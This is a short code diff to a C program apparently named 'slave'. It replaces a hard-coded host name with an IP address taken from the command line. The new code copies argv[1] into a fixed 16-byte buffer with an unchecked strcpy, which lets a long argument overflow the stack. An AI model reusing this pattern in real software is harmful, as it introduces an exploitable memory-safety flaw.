@@ -42,7 +42,7 @@ void reception_info_crash();
 int main(int argc, char **argv){
 
 
-	char host[] = "thespygeek";
+	char host[INET_ADDRSTRLEN];
 
 	int int_cmd;
 	int n, nb_octets, nb_char;
@@ -52,6 +52,12 @@ int main(int argc, char **argv){
 
 	int file;
 
+	if(argc < 2){
+    	printf("./slave <IP>\n");
+    	exit(0);
+    } else {
+    	strcpy(host, argv[1]);
+    }
 
 
     signal(SIGINT, handler_kill);
